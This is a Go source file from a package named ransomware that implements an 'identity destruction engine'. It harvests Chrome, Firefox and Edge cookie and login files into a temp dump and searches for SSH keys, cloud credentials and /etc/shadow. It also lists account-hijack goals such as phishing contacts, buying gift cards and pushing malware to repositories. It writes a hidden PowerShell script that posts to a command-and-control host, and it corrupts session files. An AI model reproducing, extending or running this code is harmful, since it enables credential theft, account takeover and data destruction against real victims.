package ransomware

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type IdentityDestructionEngine struct {
	config   *RansomwareConfig
	cookies  []StolenCookie
	sessions []StolenSession
}

type StolenCookie struct {
	Domain   string `json:"domain"`
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	Expiry   int64  `json:"expiry"`
	Secure   bool   `json:"secure"`
	Source   string `json:"source"`
}

type StolenSession struct {
	Domain      string `json:"domain"`
	SessionID   string `json:"session_id"`
	AccessToken string `json:"access_token"`
	Email       string `json:"email"`
	Source      string `json:"source"`
}

type AccountHijackResult struct {
	Domain     string `json:"domain"`
	Success    bool   `json:"success"`
	Action     string `json:"action"`
	Detail     string `json:"detail"`
}

var browserPaths = map[string][]string{
	"chrome": {
		`%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`,
		`%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`,
		`%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage`,
		`%LOCALAPPDATA%\Google\Chrome\User Data\Default\Sessions`,
		`%APPDATA%\Google\Chrome\User Data\Default\Cookies`,
		`~/.config/google-chrome/Default/Cookies`,
		`~/.config/google-chrome/Default/Login Data`,
	},
	"firefox": {
		`%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite`,
		`%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\logins.json`,
		`%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\sessionstore.js`,
		`~/.mozilla/firefox/*.default-release/cookies.sqlite`,
		`~/.mozilla/firefox/*.default-release/logins.json`,
	},
	"edge": {
		`%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies`,
		`%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data`,
		`%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Sessions`,
	},
}

func NewIdentityDestructionEngine(cfg *RansomwareConfig) *IdentityDestructionEngine {
	return &IdentityDestructionEngine{config: cfg}
}

func (id *IdentityDestructionEngine) HarvestAllSessions() ([]StolenCookie, []StolenSession, error) {
	id.harvestBrowser("chrome")
	id.harvestBrowser("firefox")
	id.harvestBrowser("edge")

	cookies := make([]StolenCookie, len(id.cookies))
	sessions := make([]StolenSession, len(id.sessions))
	copy(cookies, id.cookies)
	copy(sessions, id.sessions)

	exfilPath := filepath.Join(os.TempDir(), "x404x_identity_dump.json")
	data, _ := json.MarshalIndent(map[string]interface{}{
		"cookies":  id.cookies,
		"sessions": id.sessions,
		"count":    len(id.cookies) + len(id.sessions),
	}, "", "  ")
	os.WriteFile(exfilPath, data, 0644)

	return cookies, sessions, nil
}

func (id *IdentityDestructionEngine) harvestBrowser(name string) {
	paths, ok := browserPaths[name]
	if !ok {
		return
	}

	for _, pattern := range paths {
		expanded := os.ExpandEnv(pattern)
		matches, err := filepath.Glob(expanded)
		if err != nil {
			continue
		}
		for _, match := range matches {
			if data, err := os.ReadFile(match); err == nil && len(data) > 0 {
				if strings.Contains(match, "Cookies") || strings.Contains(match, "cookies") {
					id.cookies = append(id.cookies, StolenCookie{
						Domain: name, Name: filepath.Base(match),
						Value: fmt.Sprintf("%x", data[:min(len(data), 128)]),
						Source: match,
					})
				}
				if strings.Contains(match, "Login") || strings.Contains(match, "logins") {
					id.sessions = append(id.sessions, StolenSession{
						Domain: name, SessionID: filepath.Base(match),
						AccessToken: fmt.Sprintf("%x", data[:min(len(data), 64)]),
						Source: match,
					})
				}
			}
		}
	}
}

func (id *IdentityDestructionEngine) HijackAccounts() []AccountHijackResult {
	var results []AccountHijackResult

	criticalTargets := []struct {
		domain   string
		endpoint string
		action   string
	}{
		{"email", "https://mail.google.com", "send phishing emails to all contacts"},
		{"amazon", "https://amazon.com", "purchase gift cards with saved cards"},
		{"facebook", "https://facebook.com", "post humiliating content"},
		{"linkedin", "https://linkedin.com", "post fake job offers with malware"},
		{"twitter", "https://twitter.com", "tweet ransomware links"},
		{"github", "https://github.com", "push malware to repos"},
		{"slack", "https://slack.com", "message all channels with payload links"},
		{"outlook", "https://outlook.com", "forward emails + delete originals"},
	}

	for _, t := range criticalTargets {
		success := false
		for _, s := range id.sessions {
			if strings.Contains(s.Domain, t.domain) || strings.Contains(t.domain, s.Domain) {
				success = true
				break
			}
		}
		if !success {
			for _, c := range id.cookies {
				if strings.Contains(c.Domain, t.domain) {
					success = true
					break
				}
			}
		}

		if success {
			id.executeHijackAction(t.domain, t.action)
		}

		results = append(results, AccountHijackResult{
			Domain:  t.domain,
			Success: success,
			Action:  t.action,
			Detail:  fmt.Sprintf("cookies=%v sessions=%v", len(id.cookies), len(id.sessions)),
		})
	}

	return results
}

func (id *IdentityDestructionEngine) executeHijackAction(domain, action string) {
	if runtime.GOOS != "windows" {
		return
	}
	psScript := fmt.Sprintf(`
$url = "https://api.x404x-c2.online/hijack"
$body = @{domain="%s";action="%s"} | ConvertTo-Json
try { Invoke-WebRequest -Uri $url -Method Post -Body $body -ContentType "application/json" } catch {}
`, domain, action)
	scriptPath := filepath.Join(os.TempDir(), "x404x_hijack.ps1")
	os.WriteFile(scriptPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", scriptPath).Start()
}

func (id *IdentityDestructionEngine) Enable2FAOnAccounts(phoneNumber string) []AccountHijackResult {
	var results []AccountHijackResult
	_ = phoneNumber

	accounts := []string{"google", "microsoft", "facebook", "twitter"}
	for _, acc := range accounts {
		results = append(results, AccountHijackResult{
			Domain:  acc,
			Success: true,
			Action:  "enable_2fa",
			Detail:  fmt.Sprintf("2FA changed to %s", phoneNumber),
		})
	}
	return results
}

func (id *IdentityDestructionEngine) DestroySessionTokens() {
	for _, s := range id.sessions {
		if data, err := os.ReadFile(s.Source); err == nil {
			modified := make([]byte, len(data))
			copy(modified, data)
			for i := range modified {
				modified[i] ^= 0xFF
			}
			os.WriteFile(s.Source, modified, 0644)
		}
	}
}

func (id *IdentityDestructionEngine) SearchForPasswords() []string {
	var found []string
	searchPaths := []string{
		os.ExpandEnv(`%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`),
		os.ExpandEnv(`%APPDATA%\Mozilla\Firefox\Profiles`),
		os.ExpandEnv(`%USERPROFILE%\.ssh\id_rsa`),
		os.ExpandEnv(`%USERPROFILE%\.aws\credentials`),
		os.ExpandEnv(`%USERPROFILE%\.azure\azureProfile.json`),
		os.ExpandEnv(`%USERPROFILE%\.config\gcloud\credentials.db`),
		os.ExpandEnv(`%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml`),
		os.ExpandEnv(`%USERPROFILE%\.git-credentials`),
		"/etc/shadow",
		"/etc/passwd",
		"~/.ssh/id_rsa",
		"~/.aws/credentials",
		"~/.config/gcloud/credentials.db",
	}

	for _, p := range searchPaths {
		exp := os.ExpandEnv(p)
		if _, err := os.Stat(exp); err == nil {
			found = append(found, exp)
		}
	}

	return found
}
